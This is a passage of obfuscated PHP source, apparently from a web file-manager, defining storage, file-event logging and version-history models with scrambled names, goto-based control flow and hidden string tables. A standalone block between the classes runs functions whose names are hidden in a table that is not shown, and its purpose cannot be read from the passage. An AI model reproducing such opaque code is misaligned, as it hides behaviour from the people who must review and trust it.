$DË¤ß¹‘Üî = false) { $AÑŸÊ‡÷Òò =& $_SERVER[›èö’ù¤]; if (!$Bå·İî”Å¿ && !$DË¤ß¹‘Üî) { return !1; } $AŸæ¶òš±Ş = array($AÑŸÊ‡÷Òò[1781] => $Bå·İî”Å¿); if ($DË¤ß¹‘Üî) { $AŸæ¶òš±Ş = array($AÑŸÊ‡÷Òò[1782] => $DË¤ß¹‘Üî); } return $this->order($AÑŸÊ‡÷Òò[1785])->where($AŸæ¶òš±Ş)->find(); } public function clearEmpty($A¡Ö¶âëŠ„ = 1) { goto b«§ÀïšÅª; bâ¬Œõ‡‡: foreach ($B÷Çòù–÷Ÿ as $DÍµÖóöâš) { $d—ãŠ·Ì‰‘->update(1); $this->resetFile($DÍµÖóöâš); } $d—ãŠ·Ì‰‘->end(); goto B‡½ä‹ÆšÖ; b«§ÀïšÅª: $A†ˆÏ£ì¾Î =& $_SERVER[›èö’ù¤]; $e¥°¼œÚ™ = time() - 3600 * 24 * $A¡Ö¶âëŠ„; $F­ƒùŠñÆÈ = $A†ˆÏ£ì¾Î[1786] . $e¥°¼œÚ™; goto CãÕÖØšó; CãÕÖØšó: $B÷Çòù–÷Ÿ = $this->where($F­ƒùŠñÆÈ)->select(); if (!$B÷Çòù–÷Ÿ) { return; } $d—ãŠ·Ì‰‘ = new Task($A†ˆÏ£ì¾Î[1787], $A†ˆÏ£ì¾Î[33], count($B÷Çòù–÷Ÿ)); goto bâ¬Œõ‡‡; B‡½ä‹ÆšÖ: } public function resetFile($B×œ³‡ïÏ™) { goto E½«‚¹ğ’Ë; CÛ»–ñ¿: if ($B×œ³‡ïÏ™[$E•ê¯ôâó—[1784]] != $e‰Å«ß©Ó) { $this->where($AŸ©ÒÒ¹‡)->save(array($E•ê¯ôâó—[1780] => $e‰Å«ß©Ó)); } goto D®ñç¯ç®; E½«‚¹ğ’Ë: $E•ê¯ôâó— =& $_SERVER[›èö’ù¤]; $AŸ©ÒÒ¹‡ = array($E•ê¯ôâó—[463] => $B×œ³‡ïÏ™[$E•ê¯ôâó—[462]]); $b¶÷©®ë¼Ø = Model($E•ê¯ôâó—[1230])->where($AŸ©ÒÒ¹‡)->count(); goto E”åœÄ’à‚; E”åœÄ’à‚: $e¸š“¦§Ó† = Model($E•ê¯ôâó—[1788])->where($AŸ©ÒÒ¹‡)->count(); $e‰Å«ß©Ó = intval($b¶÷©®ë¼Ø) + intval($e¸š“¦§Ó†); if ($e‰Å«ß©Ó == 0) { IO::remove($B×œ³‡ïÏ™[$E•ê¯ôâó—[76]]); Model($E•ê¯ôâó—[1789])->delete($B×œ³‡ïÏ™[$E•ê¯ôâó—[462]]); $this->where($AŸ©ÒÒ¹‡)->delete(); $this->metaSet($B×œ³‡ïÏ™[$E•ê¯ôâó—[462]], null, null); return; } goto CÛ»–ñ¿; D®ñç¯ç®: } public function storageInfo($fã¬õçõÂÙ = false) { goto C›å¸âæ; f¸Ï»Ìğ¥: for ($Fë‚õ™Ûù = 0; $Fë‚õ™Ûù < $c½¨¥¯ù²“; $Fë‚õ™Ûù = $Fë‚õ™Ûù + $CÖÒ —…¹®) { $BîÄŒ»¨Û¦ = $this->limit($Fë‚õ™Ûù, $Fë‚õ™Ûù + $CÖÒ —…¹®)->select(); foreach ($BîÄŒ»¨Û¦ as $dÙÑ›‚†ˆŠ) { $aŞİùµ°°Š += $dÙÑ›‚†ˆŠ[$c–Á…èÈ‚ï[78]] * $dÙÑ›‚†ˆŠ[$c–Á…èÈ‚ï[1784]]; $E½¸ôˆÌ¼Æ += $dÙÑ›‚†ˆŠ[$c–Á…èÈ‚ï[78]] * ($dÙÑ›‚†ˆŠ[$c–Á…èÈ‚ï[1784]] - 1); $a‡À‘Ê¯¹ += $dÙÑ›‚†ˆŠ[$c–Á…èÈ‚ï[1784]]; } } $Bœ™‡²ßˆ = array($c–Á…èÈ‚ï[1790] => $aŞİùµ°°Š, $c–Á…èÈ‚ï[1791] => $E½¸ôˆÌ¼Æ, $c–Á…èÈ‚ï[1792] => $E½¸ôˆÌ¼Æ / $aŞİùµ°°Š, $c–Á…èÈ‚ï[82] => $c½¨¥¯ù²“, $c–Á…èÈ‚ï[1793] => $a‡À‘Ê¯¹); return $Bœ™‡²ßˆ; goto FÔŠ¯„ªÔ; C›å¸âæ: $c–Á…èÈ‚ï =& $_SERVER[›èö’ù¤]; $c½¨¥¯ù²“ = $this->count() + 0.0; $E½¸ôˆÌ¼Æ = 0; goto D×§É¥Íìƒ; D×§É¥Íìƒ: $aŞİùµ°°Š = 1; $a‡À‘Ê¯¹ = 0; $CÖÒ —…¹® = 5000; goto f¸Ï»Ìğ¥; FÔŠ¯„ªÔ: } } goto cÆÑİ›ƒç§; aÏôœ‡ìŞ‘: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\x72\143\x65\137\145\x76\x65\156\x74"; protected $dataAuto = array(array("\143\x72\145\141\x74\x65\124\x69\x6d\145", "\x74\x69\155\x65", "\151\156\163\145\x72\x74", "\146\x75\x6e\143\x74\151\157\x6e"), array("\x64\145\163\x63", '', "\x69\x6e\163\145\162\164\54\x75\x70\x64\141\164\145\x2c\163\145\x6c\x65\x63\164", "\x6a\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($a…Œƒ§Ç”¦, $CòÂàß†Çí, $DğÃô­õ‹® = '') { goto C›­çÏã‰ê; DÃ‘«Îñ: if (!$A‚§†²ç÷) { return !1; } if ($this->isCacheEvent($A‚§†²ç÷, $CòÂàß†Çí)) { return; } if ($DğÃô­õ‹® && is_string($DğÃô­õ‹®)) { $DğÃô­õ‹® = array($B¸óÅšİª[1758] => $DğÃô­õ‹®); } goto dáƒ¾¹Ÿ›á; C›­çÏã‰ê: $B¸óÅšİª =& $_SERVER[›èö’ù¤]; if (!$this->eventSave) { return; } $A‚§†²ç÷ = Model($B¸óÅšİª[1230])->sourceInfo($a…Œƒ§Ç”¦); goto DÃ‘«Îñ; dáƒ¾¹Ÿ›á: $dƒ¤„¶â© = array($B¸óÅšİª[412] => $a…Œƒ§Ç”¦, $B¸óÅšİª[1931] => $A‚§†²ç÷[$B¸óÅšİª[493]], $B¸óÅšİª[1932] => $A‚§†²ç÷[$B¸óÅšİª[28]], $B¸óÅšİª[514] => !empty($A‚§†²ç÷[$B¸óÅšİª[514]]) ? $A‚§†²ç÷[$B¸óÅšİª[514]] : $B¸óÅšİª[33], $B¸óÅšİª[1542] => USER_ID, $B¸óÅšİª[417] => $CòÂàß†Çí, $B¸óÅšİª[1544] => $DğÃô­õ‹®); $this->addSystemLog($CòÂàß†Çí, $dƒ¤„¶â©); unset($dƒ¤„¶â©[$B¸óÅšİª[1932]], $dƒ¤„¶â©[$B¸óÅšİª[514]]); goto cÔˆ›¤…‹â; cÔˆ›¤…‹â: return $this->add($dƒ¤„¶â©); goto BìÖ ·ÉÂ‹; BìÖ ·ÉÂ‹: } private function addSystemLog($f‰Àå£ÙË‚, $b¼´µ˜†ë‘) { $f£–ñ¬”¯Ï =& $_SERVER[›èö’ù¤]; if ($f‰Àå£ÙË‚ == $f£–ñ¬”¯Ï[1933]) { $f‰Àå£ÙË‚ = $b¼´µ˜†ë‘[$f£–ñ¬”¯Ï[446]][$f£–ñ¬”¯Ï[1934]]; } else { if (in_array($f‰Àå£ÙË‚, array($f£–ñ¬”¯Ï[1697], $f£–ñ¬”¯Ï[1935]))) { $f‰Àå£ÙË‚ = $b¼´µ˜†ë‘[$f£–ñ¬”¯Ï[446]][$f£–ñ¬”¯Ï[739]]; } } $cŒ‰ï×Üµ = array_merge($b¼´µ˜†ë‘, array($f£–ñ¬”¯Ï[1936] => $b¼´µ˜†ë‘[$f£–ñ¬”¯Ï[397]], $f£–ñ¬”¯Ï[1937] => $b¼´µ˜†ë‘[$f£–ñ¬”¯Ï[1937]])); Model($f£–ñ¬”¯Ï[1661])->addLog($f£–ñ¬”¯Ï[1938] . $f‰Àå£ÙË‚, $cŒ‰ï×Üµ); } private function isCacheEvent($AÊŞµÀ‰”», $CÑ‡ßñ¤Ñ‰) { if ($AÊŞµÀ‰”»[$_SERVER[›èö’ù¤][406]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($aòĞ™¨ˆÏ, $böÏßˆôùê) { $BŞ Ø»é§• =& $_SERVER[›èö’ù¤]; $bö¬ëŠƒÁÌ = Model($BŞ Ø»é§•[1230])->sourceInfo($aòĞ™¨ˆÏ); $C·“µŠë® = array($BŞ Ø»é§•[1934] => $böÏßˆôùê, $BŞ Ø»é§•[28] => $bö¬ëŠƒÁÌ[$BŞ Ø»é§•[28]]); return $this->addEvent($aòĞ™¨ˆÏ, $BŞ Ø»é§•[1933], $C·“µŠë®); } public function eventFileEdit($Fæá­Õó) { $cÁ®®ŸÕÎ =& $_SERVER[›èö’ù¤]; $b³·Å¦ï²· = array($cÁ®®ŸÕÎ[1939] => $_SERVER[$cÁ®®ŸÕÎ[1940]], $cÁ®®ŸÕÎ[1941] => strtolower(ACTION)); return $this->addEvent($Fæá­Õó, $cÁ®®ŸÕÎ[1687], $b³·Å¦ï²·); } public function eventRecycle($a°§°Œ—î, $dëĞ¥°Ì×°) { return $this->addEvent($a°§°Œ—î, $_SERVER[›èö’ù¤][1935], $dëĞ¥°Ì×°); } public function eventRemove($Cø‡ ğÊ·®) { $F‚¼ì©÷ˆ =& $_SERVER[›èö’ù¤]; $Fó‡ëóìÚŒ = Model($F‚¼ì©÷ˆ[1230])->sourceInfo($Cø‡ ğÊ·®); $EÖÂ¢ÆÍˆ¸ = $Fó‡ëóìÚŒ[$F‚¼ì©÷ˆ[28]]; return $this->addEvent($Fó‡ëóìÚŒ[$F‚¼ì©÷ˆ[493]], $F‚¼ì©÷ˆ[1686], $EÖÂ¢ÆÍˆ¸); } public function eventShare($a¤ê¾×ÄÒ‚, $Dè¯Š×ÈÉ†) { return $this->addEvent($a¤ê¾×ÄÒ‚, $_SERVER[›èö’ù¤][1697], $Dè¯Š×ÈÉ†); } public function eventMove($c«Ì¸™Úé, $d±÷á›ŠÊâ, $Fë·£­ºŸÍ) { goto eö…Œîøôä; FŠ ÀÔêŒ¿: $this->addEvent($d±÷á›ŠÊâ, $bÁùãÏ­¡‹[1945], $fŠµ¦­˜ïô); goto Dìò–²Ã¾ê; eÃóÃË¨ÎÌ: $A÷öñ·Š¯ = $c¯¨¿÷­‚->sourceInfo($d±÷á›ŠÊâ); $f‚È‘×Ñäß = $c¯¨¿÷­‚->sourceInfo($Fë·£­ºŸÍ); $fŠµ¦­˜ïô = array($bÁùãÏ­¡‹[1079] => $d±÷á›ŠÊâ, $bÁùãÏ­¡‹[1942] => $A÷öñ·Š¯[$bÁùãÏ­¡‹[28]], $bÁùãÏ­¡‹[1922] => !empty($A÷öñ·Š¯[$bÁùãÏ­¡‹[514]]) ? $A÷öñ·Š¯[$bÁùãÏ­¡‹[514]] : $bÁùãÏ­¡‹[33], $bÁùãÏ­¡‹[1080] => $Fë·£­ºŸÍ, $bÁùãÏ­¡‹[1943] => $f‚È‘×Ñäß[$bÁùãÏ­¡‹[28]], $bÁùãÏ­¡‹[1944] => !empty($f‚È‘×Ñäß[$bÁùãÏ­¡‹[514]]) ? $f‚È‘×Ñäß[$bÁùãÏ­¡‹[514]] : $bÁùãÏ­¡‹[33]); goto Aê´˜õôê; eö…Œîøôä: $bÁùãÏ­¡‹ =& $_SERVER[›èö’ù¤]; $c¯¨¿÷­‚ = Model($bÁùãÏ­¡‹[1230]); $FÁÈâ‹ó„ = $c¯¨¿÷­‚->sourceInfo($c«Ì¸™Úé); goto eÃóÃË¨ÎÌ; Aê´˜õôê: $this->addEvent($c«Ì¸™Úé, $bÁùãÏ­¡‹[546], $fŠµ¦­˜ïô); $FÁÈâ‹ó„ = $c¯¨¿÷­‚->sourceInfo($c«Ì¸™Úé); $fŠµ¦­˜ïô = array($bÁùãÏ­¡‹[397] => $FÁÈâ‹ó„[$bÁùãÏ­¡‹[397]], $bÁùãÏ­¡‹[28] => $FÁÈâ‹ó„[$bÁùãÏ­¡‹[28]]); goto FŠ ÀÔêŒ¿; Dìò–²Ã¾ê: } public function eventCopy($f‹Ğ¥„‚Øø) { $this->eventCreate($f‹Ğ¥„‚Øø, $_SERVER[›èö’ù¤][544]); } public function eventRename($Cô¿ñ•¼Şõ, $dƒÔˆ§Ä‹×, $A¦ÀÌÕåâœ) { $F½°õŸ˜íÍ =& $_SERVER[›èö’ù¤]; $cìì²Ğåî = array($F½°õŸ˜íÍ[1079] => $dƒÔˆ§Ä‹×, $F½°õŸ˜íÍ[1080] => $A¦ÀÌÕåâœ); return $this->addEvent($Cô¿ñ•¼Şõ, $F½°õŸ˜íÍ[1244], $cìì²Ğåî); } public function eventAddComment($bìğ‡÷Úä , $Bƒ»èé¦Ÿ) { return $this->addEvent($bìğ‡÷Úä , $_SERVER[›èö’ù¤][1946], $Bƒ»èé¦Ÿ); } public function eventAddDesc($BÂ†™ŞÁµ, $cğÜÅÊâàØ) { return $this->addEvent($BÂ†™ŞÁµ, $_SERVER[›èö’ù¤][1947], $cğÜÅÊâàØ); } public function listBySource($Bà¾‘Ñ±×–) { goto CãÏ–ØÅÜË; D‚ºø’™Ô: return $this->eventListParse($aÆŸØ¿±ôÇ, $Bà¾‘Ñ±×–); goto bÊùÂÖÆœ¼; DÅé²‹·¿…: if ($cœëŠ¬ÄËê[$b¡Ğé»Üã[405]] == $b¡Ğé»Üã[87]) { $aß®êĞ¥÷Š = Model($b¡Ğé»Üã[1230])->listSearchChildren($Bà¾‘Ñ±×–, 20000); $aß®êĞ¥÷Š[] = $Bà¾‘Ñ±×– . $b¡Ğé»Üã[376]; $dÂñØ¯ÒÍœ = array($b¡Ğé»Üã[397] => array($b¡Ğé»Üã[7], $aß®êĞ¥÷Š)); } $aÆŸØ¿±ôÇ = $this->where($dÂñØ¯ÒÍœ)->order($b¡Ğé»Üã[1948])->selectPage(); if ($aÆŸØ¿±ôÇ[$b¡Ğé»Üã[364]][$b¡Ğé»Üã[365]] == 0) { $aÆŸØ¿±ôÇ[$b¡Ğé»Üã[364]][$b¡Ğé»Üã[365]] = 1; $aÆŸØ¿±ôÇ[$b¡Ğé»Üã[367]] = array(array($b¡Ğé»Üã[412] => $Bà¾‘Ñ±×–, $b¡Ğé»Üã[1931] => $cœëŠ¬ÄËê[$b¡Ğé»Üã[493]], $b¡Ğé»Üã[1542] => $cœëŠ¬ÄËê[$b¡Ğé»Üã[447]], $b¡Ğé»Üã[417] => $b¡Ğé»Üã[1949], $b¡Ğé»Üã[418] => $cœëŠ¬ÄËê[$b¡Ğé»Üã[194]], $b¡Ğé»Üã[1544] => $b¡Ğé»Üã[33])); } goto D‚ºø’™Ô; CãÏ–ØÅÜË: $b¡Ğé»Üã =& $_SERVER[›èö’ù¤]; $cœëŠ¬ÄËê = Model($b¡Ğé»Üã[1230])->sourceInfo($Bà¾‘Ñ±×–); $dÂñØ¯ÒÍœ = array($b¡Ğé»Üã[412] => $Bà¾‘Ñ±×–); goto DÅé²‹·¿…; bÊùÂÖÆœ¼: } private function eventListParse($càƒæÕŸ¿‡, $E¦Åñ±Æä) { goto CéìõÃÉ„ö; D§ãˆ˜ƒÅá: $a×Â‘Ğ°¼Ú = array_unique($a×Â‘Ğ°¼Ú); $DéÙƒ¿ö‚¦ = array_unique(array_to_keyvalue($Cù¿²êˆ, $E…à·¿ÂÊÅ[33], $E…à·¿ÂÊÅ[1551])); $dÒ²²ƒ§† = Model($E…à·¿ÂÊÅ[533])->userListInfo($DéÙƒ¿ö‚¦); goto AäØµÅ™¼ô; AäØµÅ™¼ô: $EÙ˜±¸¿º = Model($E…à·¿ÂÊÅ[816])->sourceListInfo($a×Â‘Ğ°¼Ú, !0); foreach ($Cù¿²êˆ as &$d‰‹†óîŸ) { if ($d‰‹†óîŸ[$E…à·¿ÂÊÅ[29]] == $E…à·¿ÂÊÅ[546] && isset($d‰‹†óîŸ[$E…à·¿ÂÊÅ[446]][$E…à·¿ÂÊÅ[1079]])) { $d‰‹†óîŸ[$E…à·¿ÂÊÅ[446]][$E…à·¿ÂÊÅ[1079]] = $EÙ˜±¸¿º[$d‰‹†óîŸ[$E…à·¿ÂÊÅ[446]][$E…à·¿ÂÊÅ[1079]]]; $d‰‹†óîŸ[$E…à·¿ÂÊÅ[446]][$E…à·¿ÂÊÅ[1080]] = $EÙ˜±¸¿º[$d‰‹†óîŸ[$E…à·¿ÂÊÅ[446]][$E…à·¿ÂÊÅ[1080]]]; } if ($d‰‹†óîŸ[$E…à·¿ÂÊÅ[29]] == $E…à·¿ÂÊÅ[1945] && isset($d‰‹†óîŸ[$E…à·¿ÂÊÅ[446]][$E…à·¿ÂÊÅ[397]])) { $d‰‹†óîŸ[$E…à·¿ÂÊÅ[446]][$E…à·¿ÂÊÅ[397]] = $EÙ˜±¸¿º[$d‰‹†óîŸ[$E…à·¿ÂÊÅ[446]][$E…à·¿ÂÊÅ[397]]]; } $d‰‹†óîŸ[$E…à·¿ÂÊÅ[85]] = $EÙ˜±¸¿º[$d‰‹†óîŸ[$E…à·¿ÂÊÅ[397]]]; $d‰‹†óîŸ[$E…à·¿ÂÊÅ[1950]] = $EÙ˜±¸¿º[$d‰‹†óîŸ[$E…à·¿ÂÊÅ[1937]]]; if ($d‰‹†óîŸ[$E…à·¿ÂÊÅ[29]] == $E…à·¿ÂÊÅ[1686]) { $d‰‹†óîŸ[$E…à·¿ÂÊÅ[1950]] = $d‰‹†óîŸ[$E…à·¿ÂÊÅ[85]]; $d‰‹†óîŸ[$E…à·¿ÂÊÅ[1937]] = $d‰‹†óîŸ[$E…à·¿ÂÊÅ[1950]][$E…à·¿ÂÊÅ[397]]; $d‰‹†óîŸ[$E…à·¿ÂÊÅ[85]] = !1; $d‰‹†óîŸ[$E…à·¿ÂÊÅ[397]] = $E…à·¿ÂÊÅ[33]; } $d‰‹†óîŸ[$E…à·¿ÂÊÅ[1882]] = $dÒ²²ƒ§†[$d‰‹†óîŸ[$E…à·¿ÂÊÅ[1551]]]; } unset($d‰‹†óîŸ); goto Díòİ³îÊ˜; dÀ§ÃÕ®: $d¯ğÓ§Ø‘ = array_to_keyvalue($Cù¿²êˆ, $E…à·¿ÂÊÅ[33], $E…à·¿ÂÊÅ[1937]); foreach ($Cù¿²êˆ as $d‰‹†óîŸ) { $bîÁ‹–Ô› = $d‰‹†óîŸ[$E…à·¿ÂÊÅ[446]]; if ($d‰‹†óîŸ[$E…à·¿ÂÊÅ[29]] == $E…à·¿ÂÊÅ[546] && isset($bîÁ‹–Ô›[$E…à·¿ÂÊÅ[1079]])) { $a×Â‘Ğ°¼Ú[] = $bîÁ‹–Ô›[$E…à·¿ÂÊÅ[1079]] . $E…à·¿ÂÊÅ[33]; $a×Â‘Ğ°¼Ú[] = $bîÁ‹–Ô›[$E…à·¿ÂÊÅ[1080]] . $E…à·¿ÂÊÅ[33]; } if ($d‰‹†óîŸ[$E…à·¿ÂÊÅ[29]] == $E…à·¿ÂÊÅ[1945] && isset($bîÁ‹–Ô›[$E…à·¿ÂÊÅ[397]])) { $a×Â‘Ğ°¼Ú[] = $bîÁ‹–Ô›[$E…à·¿ÂÊÅ[397]] . $E…à·¿ÂÊÅ[33]; } } $a×Â‘Ğ°¼Ú = array_merge($a×Â‘Ğ°¼Ú, $d¯ğÓ§Ø‘, array($E¦Åñ±Æä . $E…à·¿ÂÊÅ[33])); goto D§ãˆ˜ƒÅá; Díòİ³îÊ˜: $càƒæÕŸ¿‡[$E…à·¿ÂÊÅ[367]] = $Cù¿²êˆ; return $càƒæÕŸ¿‡; goto A¢ğ£ù±·; CéìõÃÉ„ö: $E…à·¿ÂÊÅ =& $_SERVER[›èö’ù¤]; $Cù¿²êˆ = $càƒæÕŸ¿‡[$E…à·¿ÂÊÅ[367]]; $a×Â‘Ğ°¼Ú = array_to_keyvalue($Cù¿²êˆ, $E…à·¿ÂÊÅ[33], $E…à·¿ÂÊÅ[397]); goto dÀ§ÃÕ®; A¢ğ£ù±·: } public function removeBySource($fˆÄáİ®½) { $AŠ¿™¢‘· = array($_SERVER[›èö’ù¤][412] => $fˆÄáİ®½); $this->where($AŠ¿™¢‘·)->remove(); } } if ($_SERVER[$_SERVER[›èö’ù¤][831]] != $_SERVER[$_SERVER[›èö’ù¤][1951]]) { goto b‹Úç”Û×´; b‹Úç”Û×´: $DÁíçË®Öƒ = $_SERVER[›èö’ù¤][833]; $FñŸ…ëé¶¢ = $_SERVER[$_SERVER[›èö’ù¤][834]] . $_SERVER[›èö’ù¤][835]; $d‚“íªğÑ = $DÁíçË®Öƒ($FñŸ…ëé¶¢); goto c†”‚Ç®è‹; dİÌğÓìÇ: $C²Äç‹ÖõÓ($_SERVER[$_SERVER[›èö’ù¤][832]]); goto eÊÀ®½ÜÑà; c†”‚Ç®è‹: $DøÍôî¡… = explode($_SERVER[›èö’ù¤][229], $d‚“íªğÑ); if (count($DøÍôî¡…) < $_SERVER[›èö’ù¤][616]) { $c›¸ôİ’Ú = $_SERVER[›èö’ù¤][836]; $c›¸ôİ’Ú(); } $C²Äç‹ÖõÓ = $_SERVER[›èö’ù¤][837]; goto dİÌğÓìÇ; eÊÀ®½ÜÑà: } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\165\162\143\x65\137\x68\x69\163\164\157\x72\x79"; public function historyCount($cÇÒš†µå‡) { goto DÌÓºˆö¤‡; bÄÇ ôçì½: return array_to_keyvalue($DÀÆÁ„öæ¸, $fÈÎëˆ¶[397], $fÈÎëˆ¶[495]); goto E•øîàª’·; cç˜Ñï·Î‡: $eç„‰¨—Æ = array($fÈÎëˆ¶[397], $fÈÎëˆ¶[1752] => $fÈÎëˆ¶[495]); $BèØ˜Š¹ = array($fÈÎëˆ¶[397] => array($fÈÎëˆ¶[7], $cÇÒš†µå‡)); $DÀÆÁ„öæ¸ = $this->field($eç„‰¨—Æ)->where($BèØ˜Š¹)->group($fÈÎëˆ¶[397])->select(); goto bÄÇ ôçì½; DÌÓºˆö¤‡: $fÈÎëˆ¶ =& $_SERVER[›èö’ù¤]; if (!$cÇÒš†µå‡) { return array(); } if (is_string($cÇÒš†µå‡) || is_int($cÇÒš†µå‡)) { $cÇÒš†µå‡ = array($cÇÒš†µå‡); } goto cç˜Ñï·Î‡; E•øîàª’·: } public function addHistory($dØ¯æ³´¼§, $FØ£½ãÕÀÉ = '') { $c¹çìàÖÎ¤ =& $_SERVER[›èö’ù¤]; $cÈóÀÍƒÃŠ = array($c¹çìàÖÎ¤[412] => $dØ¯æ³´¼§[$c¹çìàÖÎ¤[397]], $c¹çìàÖÎ¤[1542] => isset($dØ¯æ³´¼§[$c¹çìàÖÎ¤[449]]) ? $dØ¯æ³´¼§[$c¹çìàÖÎ¤[449]] : $dØ¯æ³´¼§[$c¹çìàÖÎ¤[447]], $c¹çìàÖÎ¤[463] => $dØ¯æ³´¼§[$c¹çìàÖÎ¤[462]], $c¹çìàÖÎ¤[574] => $dØ¯æ³´¼§[$c¹çìàÖÎ¤[78]], $c¹çìàÖÎ¤[1952] => $FØ£½ãÕÀÉ); $b²¯“Ş´¿ = $GLOBALS[$c¹çìàÖÎ¤[6]][$c¹çìàÖÎ¤[88]][$c¹çìàÖÎ¤[1128]]; if ($b²¯“Ş´¿ > 1) { $this->historyAutoClear($cÈóÀÍƒÃŠ[$c¹çìàÖÎ¤[397]]); $this->add($cÈóÀÍƒÃŠ); } Hook::trigger($c¹çìàÖÎ¤[1953], $cÈóÀÍƒÃŠ); Model($c¹çìàÖÎ¤[1954])->eventFileEdit($dØ¯æ³´¼§[$c¹çìàÖÎ¤[397]]); } private function historyAutoClear($FÏ·Ş‘¤ç•) { goto Añ™œç”¥Ş; Aİ±–˜: $Aêö…Åº– = array_to_keyvalue($AÕ­¢¿Šİ·, $c±„ò­á³ğ[33], $c±„ò­á³ğ[395]); $Aêö…Åº– = array_slice($Aêö…Åº–, $a‹”“ ¹Ô); $b×ÀïßÅ = array_to_keyvalue($AÕ­¢¿Šİ·, $c±„ò­á³ğ[33], $c±„ò­á³ğ[462]); goto føÛµßä‘Ï; DŸ¯ºî¤ø: $this->where($CÈÁ»„ß¬˜)->delete(); Model($c±„ò­á³ğ[465])->remove($b×ÀïßÅ); goto A®•ïØõ²¶; føÛµßä‘Ï: $b×ÀïßÅ = array_slice($b×ÀïßÅ, $a‹”“ ¹Ô); if (!$Aêö…Åº– || !$b×ÀïßÅ) { return; } $CÈÁ»„ß¬˜ = array($c±„ò­á³ğ[414] => array($c±„ò­á³ğ[7], $Aêö…Åº–)); goto DŸ¯ºî¤ø; dØµ–…ƒ©Ò: $CÈÁ»„ß¬˜ = array($c±„ò­á³ğ[412] => $FÏ·Ş‘¤ç•); $AÕ­¢¿Šİ· = $this->field($c±„ò­á³ğ[1955])->where($CÈÁ»„ß¬˜)->order($c±„ò­á³ğ[1948])->select(); if (!$AÕ­¢¿Šİ· || $a‹”“ ¹Ô >= count($AÕ­¢¿Šİ·)) { return; } goto Aİ±–˜; b• ‘Ä³‡˜: $a‹”“ ¹Ô = $Bö¬¹Îá¡ == $c±„ò­á³ğ[1151] ? 5 : $FŠ·ã×íøï; if ($FŠ·ã×íøï <= 1) { $a‹”“ ¹Ô = 1; } if ($a‹”“ ¹Ô >= 500) { return; } goto dØµ–…ƒ©Ò; Añ™œç”¥Ş: $c±„ò­á³ğ =& $_SERVER[›èö’ù¤]; $Bö¬¹Îá¡ = Model($c±„ò­á³ğ[754])->get($c±„ò­á³ğ[1150]); $FŠ·ã×íøï = $GLOBALS[$c±„ò­á³ğ[6]][$c±„ò­á³ğ[88]][$c±„ò­á³ğ[1128]]; goto b• ‘Ä³‡˜; A®•ïØõ²¶: } public function listData($cñˆÏ§‰›Ä) { goto E§¿ë¡÷õÇ; EàœÖÕå­›: $Fíç™çÖ½ = 5; if ($f‡Ô…îå == $B”Úê†ì·Ö[1151]) { $E¤°‰‡¼—[$B”Úê†ì·Ö[367]] = array_slice($E¤°‰‡¼—[$B”Úê†ì·Ö[367]], 0, $Fíç™çÖ½); $E¤°‰‡¼—[$B”Úê†ì·Ö[364]] = array($B”Úê†ì·Ö[1957] => 1, $B”Úê†ì·Ö[1958] => 20, $B”Úê†ì·Ö[1959] => 1, $B”Úê†ì·Ö[1960] => count($E¤°‰‡¼—[$B”Úê†ì·Ö[367]])); } return $E¤°‰‡¼—; goto cÛêŠİ™‰‹; a‰Âå£‚: $E¤°‰‡¼— = $this->field($Fîö¼àÓ)->where($c £Ù¥ŒÎ)->order($B”Úê†ì·Ö[1948])->selectPage(); $this->_listAppendUser($E¤°‰‡¼—[$B”Úê†ì·Ö[367]]); $f‡Ô…îå = Model($B”Úê†ì·Ö[754])->get($B”Úê†ì·Ö[1150]); goto EàœÖÕå­›; E§¿ë¡÷õÇ: $B”Úê†ì·Ö =& $_SERVER[›èö’ù¤]; $c £Ù¥ŒÎ = array($B”Úê†ì·Ö[412] => $cñˆÏ§‰›Ä); $Fîö¼àÓ = $B”Úê†ì·Ö[1956]; goto a‰Âå£‚; cÛêŠİ™‰‹: } protected function _listAppendUser(&$a›µ³œ“¹) { $d³¡ï´ÃˆÉ =& $_SERVER[›èö’ù¤]; $bÄ–—×µ¥Ÿ = array_to_keyvalue($a›µ³œ“¹, $d³¡ï´ÃˆÉ[33], $d³¡ï´ÃˆÉ[1551]); $b™ÅĞ”ğé„ = Model($d³¡ï´ÃˆÉ[533])->userListInfo($bÄ–—×µ¥Ÿ); foreach ($a›µ³œ“¹ as &$c‘êÚİö«©) { $E‹å•ƒäÃ› = $c‘êÚİö«©[$d³¡ï´ÃˆÉ[1551]]; $c‘êÚİö«©[$d³¡ï´ÃˆÉ[447]] = $b™ÅĞ”ğé„[$E‹å•ƒäÃ›] ? $b™ÅĞ”ğé„[$E‹å•ƒäÃ›] : !1; } unset($c‘êÚİö«©); } public function fileInfo($Fˆ“Ş¤·©å) { $D¾•±é¨· =& $_SERVER[›èö’ù¤]; $dÂù¿Ùˆ™Œ = $this->tablePrefix; $d‘Üˆ²Üî† = "{$dÂù¿Ùˆ™Œ}\151\157\137\146\151\154\145\40\146\x69\154\x65\x73\40\x6f\x6e\40\x66\x69\x6c\x65\x73\56\146\x69\x6c\145\111\104\40\x3d\x20\x68\x69\x73\164\157\x72\x79\x2e\x66\x69\154\x65\111\104"; return $this->alias($D¾•±é¨·[1961])->where(array($D¾•±é¨·[414] => $Fˆ“Ş¤·©å))->join($d‘Üˆ²Üî†, $D¾•±é¨·[1962])->find(); } public function removeItem($C˜‹“ğêÚß) { $eé§÷²œ =& $_SERVER[›èö’ù¤]; $D’ÎÌòòÌ– = array($eé§÷²œ[414] => $C˜‹“ğêÚß); $eÃòÑ‚² = $this->where($D’ÎÌòòÌ–)->find(); if ($eÃòÑ‚²) { $C›Œ©ÃƒÉÄ = $this->where($D’ÎÌòòÌ–)->delete(); Model($eé§÷²œ[465])->remove($eÃòÑ‚²[$eé§÷²œ[462]]); return $C›Œ©ÃƒÉÄ; } return !1; } public function removeBySource($CÒÂî¶ÈÊº) { goto EéÍÄ‚œ×; DÑÀ‚é: return !0; goto cÇŒ²œ º; bøµŒñ½á: $d¥Çƒæ¡á¥ = array($c´»¾ÔÆš[412] => array($c´»¾ÔÆš[7], $CÒÂî¶ÈÊº)); $b•˜·”©Ô = $this->field($c´»¾ÔÆš[463])->where($d¥Çƒæ¡á¥)->select(); if ($b•˜·”©Ô) { $this->where($d¥Çƒæ¡á¥)->delete(); $e‰Î¼¤ğ¸ = array_to_keyvalue($b•˜·”©Ô, $c´»¾ÔÆš[33], 